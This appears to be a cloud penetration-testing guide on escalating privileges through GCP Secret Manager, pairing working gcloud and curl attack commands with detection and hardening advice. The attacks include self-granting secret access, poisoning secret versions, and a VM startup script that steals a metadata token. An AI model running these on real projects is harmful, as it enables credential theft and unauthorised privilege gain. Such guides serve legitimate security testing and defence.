---
cstg_id: CSTG-GCP-SECRET-MANAGER-PRIVESC
title: "GCP Secret Manager - Privilege Escalation"
provider: gcp
service: secret-manager
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - secretmanager.versions.access
  - secretmanager.secrets.setIamPolicy
  - secretmanager.versions.add
  - secretmanager.secrets.create
  - secretmanager.secrets.update
  - iam.serviceAccounts.actAs
  - cloudfunctions.functions.create
  - run.services.create
  - compute.instances.create
tools:
  - gcloud CLI
  - GCP Secret Manager REST API
  - GCP IAM Credentials API
  - GCP IAM privilege-escalation scanners
  - PMapper-style IAM graph tooling
references:
  - "https://cloud.google.com/secret-manager/docs/access-control"
  - "https://cloud.google.com/secret-manager/docs/manage-access-to-secrets"
  - "https://cloud.google.com/secret-manager/docs/access-secret-version"
  - "https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/"
  - "https://hackingthe.cloud/gcp/general-knowledge/default-service-accounts/"
  - "https://cloud.google.com/iam/docs/conditions-overview"
  - "https://cloud.google.com/secret-manager/docs/reference/rest/v1/projects.secrets/setIamPolicy"
license: CC BY-SA 4.0
---

## Summary

Privilege escalation through Secret Manager takes two complementary forms.
First, **reading secret payloads** directly escalates the attacker's reach: a
secret may contain a service-account JSON key, an OAuth client secret, a
database password, or an API token whose privileges far exceed the foothold
identity. Reading one secret can therefore promote a limited principal into a
much more powerful one elsewhere in the environment.

Second, the principal may not yet hold `secretmanager.versions.access` but holds
an *adjacent* permission that can be turned into payload access -
`secretmanager.secrets.setIamPolicy` (grant yourself accessor),
`secretmanager.versions.add` / `secrets.update` (overwrite a secret a privileged
consumer will load), or `iam.serviceAccounts.actAs` plus a deploy permission
(run a workload as an SA that already holds accessor). This page enumerates each
primitive as its own subsection. Every path assumes the named permission was
discovered during
[enumeration](../02-services/gcp-secret-manager-enum.md). The downstream use of
recovered credentials is covered in
[Post-Exploitation](../05-post-exploitation/gcp-secret-manager-post-exploitation.md).

## Prerequisites

An assumed-breach foothold: a valid credential (user OAuth token, SA key, or a
token harvested from a workload metadata server) plus at least one of the
permissions below, on a project or on a specific secret. The target secret must
contain a credential more privileged than the starting identity, or the target
SA/consumer reached via the path must be more privileged. Confirm held
permissions before acting:

```bash
gcloud config list account
curl -s -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  -d '{"permissions":["secretmanager.versions.access","secretmanager.secrets.setIamPolicy","secretmanager.versions.add","secretmanager.secrets.update"]}' \
  "https://secretmanager.googleapis.com/v1/projects/<PROJECT_ID>/secrets/<SECRET>:testIamPermissions"
```

## Enumeration

Identify which escalation primitives the current principal holds, and on which
secret, then map what each secret likely contains from its name/labels.

```bash
# Secrets visible in the project and their IAM
for S in $(gcloud secrets list --project=<PROJECT_ID> --format="value(name)"); do
  echo "== $S =="
  gcloud secrets get-iam-policy "$S" --project=<PROJECT_ID> --format="json"
done

# Which secrets grant the current principal accessor or setIamPolicy?
gcloud projects get-iam-policy <PROJECT_ID> --flatten="bindings[].members" \
  --filter="bindings.members:$(gcloud config get-value account)" \
  --format="table(bindings.role)"

# Service accounts whose attached workloads might already hold accessor
gcloud iam service-accounts list --project=<PROJECT_ID> --format="value(email)"
```

## Misconfigurations & Findings

- A non-admin principal holding `secretmanager.secrets.setIamPolicy` on a secret
  (via a custom role, `roles/secretmanager.admin`, or `roles/owner`) - it can
  bind itself `secretAccessor` and read the payload.
- The principal holds `secretmanager.versions.access` on a secret that stores a
  highly privileged credential (SA key JSON, org-admin token).
- The principal can `versions.add` / `secrets.update` on a secret that a more
  privileged workload reads at runtime - poisoning the secret hijacks that
  workload.
- `iam.serviceAccounts.actAs` plus a deploy permission, where the named SA holds
  `secretAccessor` on target secrets - workload-as-SA pivot to payload access.
- Default Compute Engine SA (Editor) bound as accessor and attachable to
  attacker-created workloads.

## Exploitation

### secretmanager.versions.access

The direct path: read the plaintext and inherit whatever privileges the secret
confers.

```bash
# Latest version
gcloud secrets versions access latest --secret=<SECRET> --project=<PROJECT_ID>

# Specific version
gcloud secrets versions access 3 --secret=<SECRET> --project=<PROJECT_ID>

# REST (payload is base64 in data field)
curl -s -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  "https://secretmanager.googleapis.com/v1/projects/<PROJECT_ID>/secrets/<SECRET>/versions/latest:access" \
  | python3 -c 'import sys,json,base64;print(base64.b64decode(json.load(sys.stdin)["payload"]["data"]).decode())'
```

If the recovered payload is a service-account key, activate it and continue as
that SA:

```bash
printf '%s' "$PAYLOAD" > sa.json
gcloud auth activate-service-account --key-file=sa.json
```

### secretmanager.secrets.setIamPolicy

If the principal can rewrite a secret's IAM policy, it grants itself
`roles/secretmanager.secretAccessor` and then reads the payload - even with no
prior access permission.

```bash
gcloud secrets add-iam-policy-binding <SECRET> --project=<PROJECT_ID> \
  --member="user:me@example.com" \
  --role="roles/secretmanager.secretAccessor"

# Raw REST
curl -s -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  -d '{"policy":{"bindings":[{"role":"roles/secretmanager.secretAccessor","members":["user:me@example.com"]}]}}' \
  "https://secretmanager.googleapis.com/v1/projects/<PROJECT_ID>/secrets/<SECRET>:setIamPolicy"

gcloud secrets versions access latest --secret=<SECRET> --project=<PROJECT_ID>
```

The project-level variant (`resourcemanager.projects.setIamPolicy`) grants
accessor across every secret at once - see
[IAM privilege escalation](gcp-iam-privesc.md).

### secretmanager.versions.add

Add a new secret version (which becomes `latest`) containing attacker-controlled
content. Any privileged workload or pipeline that loads `latest` at startup will
consume the planted value - for example a connection string pointing at an
attacker-controlled host, or a token the attacker also holds. This converts
write access into control over the consuming identity.

```bash
printf '%s' '<attacker-controlled-value>' \
  | gcloud secrets versions add <SECRET> --project=<PROJECT_ID> --data-file=-

# REST
curl -s -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  -d '{"payload":{"data":"'"$(printf '%s' '<value>' | base64)"'"}}' \
  "https://secretmanager.googleapis.com/v1/projects/<PROJECT_ID>/secrets/<SECRET>:addVersion"
```

### secretmanager.secrets.update

Allows changing secret metadata such as `replication` configuration, labels, or
the CMEK key reference, and (combined with versioning) the effective behavior of
consumers. On its own it does not read payloads, but it can redirect a secret's
encryption to a key the attacker controls or relax constraints that protected
it; pair with `versions.add` for full content control.

```bash
gcloud secrets update <SECRET> --project=<PROJECT_ID> \
  --update-labels=touched=1
```

### secretmanager.secrets.create

Create a new secret and version, then bind a privileged consumer or pipeline to
read it. As a standalone primitive this mainly enables planting content;
combined with a deployment the attacker controls, it seeds credentials a
workload will load. More impactful when chained with `setIamPolicy` to grant a
target SA accessor on the new secret.

### iam.serviceAccounts.actAs (+ a deploy permission)

When the principal lacks accessor but a service account holds
`roles/secretmanager.secretAccessor`, attach that SA to an attacker-created
workload and have the workload read the secret using the SA's identity. `actAs`
authorizes the attachment; the deploy permission provides the vehicle.

#### cloudfunctions.functions.create

```bash
gcloud functions deploy sx --runtime python311 --trigger-http --allow-unauthenticated \
  --service-account=<ACCESSOR_SA_EMAIL> --entry-point=h --source=. --region=us-central1
# function code calls the Secret Manager access endpoint as the attached SA and
# returns the plaintext, or exfiltrates the SA token from the metadata server:
#  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

#### run.services.create

```bash
gcloud run deploy sx --image=<attacker-image> \
  --service-account=<ACCESSOR_SA_EMAIL> --allow-unauthenticated --region=us-central1
# container reads gs secret via REST as the attached SA and returns it
```

#### compute.instances.create

```bash
gcloud compute instances create sx --service-account=<ACCESSOR_SA_EMAIL> \
  --scopes=cloud-platform --zone=us-central1-a \
  --metadata=startup-script='T=$(curl -s -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
    | cut -d\" -f4); \
   curl -s -H "Authorization: Bearer $T" \
    "https://secretmanager.googleapis.com/v1/projects/<PROJECT_ID>/secrets/<SECRET>/versions/latest:access"'
```

See [Service Accounts privilege escalation](gcp-service-accounts-privesc.md) and
[Cloud Functions privilege escalation](gcp-cloud-functions-privesc.md) for the
full workload-as-SA mechanics.

## Detection & Logging

All Secret Manager mutations are **Admin Activity** logs in **Cloud Audit Logs**
(always on); payload access is a **Data Access** log that must be explicitly
enabled:

- `SetIamPolicy` on a secret adding a new `secretAccessor` member.
- `AddSecretVersion`, `UpdateSecret`, `CreateSecret`.
- `AccessSecretVersion` (Data Access) - the actual payload read; invisible
  unless DATA_READ logging is on for `secretmanager.googleapis.com`.
- Workload creation events (`functions.create`, `run.services.create`,
  `compute.instances.insert`) whose `serviceAccount` field is an accessor SA
  differing from the deployer.

```bash
gcloud logging read \
  'protoPayload.serviceName="secretmanager.googleapis.com" AND
   (protoPayload.methodName:"SetIamPolicy" OR protoPayload.methodName:"AddSecretVersion"
    OR protoPayload.methodName:"AccessSecretVersion")' \
  --project=<PROJECT_ID> --freshness=7d
```

Alert on: self-added accessor bindings, version additions to secrets the
principal does not own, and access spikes for secrets/identities outside normal
baselines. CMEK-protected secrets also generate Cloud KMS `Decrypt` logs on each
access - a second, separately-controlled signal.

## Remediation & Hardening

- Restrict `secretmanager.secrets.setIamPolicy` to dedicated secret
  administrators; do not include it in broadly-bound custom roles.
- Grant `secretAccessor` per secret with **IAM Conditions** scoping by
  `resource.name`; never project-wide for sensitive secrets.
- Separate **write** (`versions.add`/`secrets.update`) from **read** to prevent
  poison-and-consume escalation; review which workloads load `latest`.
- Constrain `actAs`/`serviceAccountUser` to specific SAs via IAM Conditions, and
  remove `secretAccessor` from default Compute/App Engine SAs.
- Use **CMEK** so payload access additionally requires KMS-key access you can
  audit and revoke independently.
- Enable **Data Access logging** so reads and IAM changes are auditable, and
  enforce **VPC Service Controls** around the API.

## Tools

- **gcloud CLI** / **Secret Manager REST API** - access payloads, set IAM,
  add versions.
- **IAM Credentials API** - mint tokens for SAs reached via `actAs`.
- **GCP IAM privilege-escalation scanners** - enumerate held permissions and
  report exploitable secret paths.
- **IAM graph / path-mapping tools** - model which principals can reach
  `secretmanager.versions.access` directly or via impersonation/workloads.

## References

- Access control - https://cloud.google.com/secret-manager/docs/access-control
- Manage access to secrets - https://cloud.google.com/secret-manager/docs/manage-access-to-secrets
- Access a secret version - https://cloud.google.com/secret-manager/docs/access-secret-version
- Rhino Security Labs - GCP privilege escalation - https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- Hacking the Cloud - default service accounts - https://hackingthe.cloud/gcp/general-knowledge/default-service-accounts/
- IAM Conditions overview - https://cloud.google.com/iam/docs/conditions-overview
- secrets.setIamPolicy reference - https://cloud.google.com/secret-manager/docs/reference/rest/v1/projects.secrets/setIamPolicy
</content>
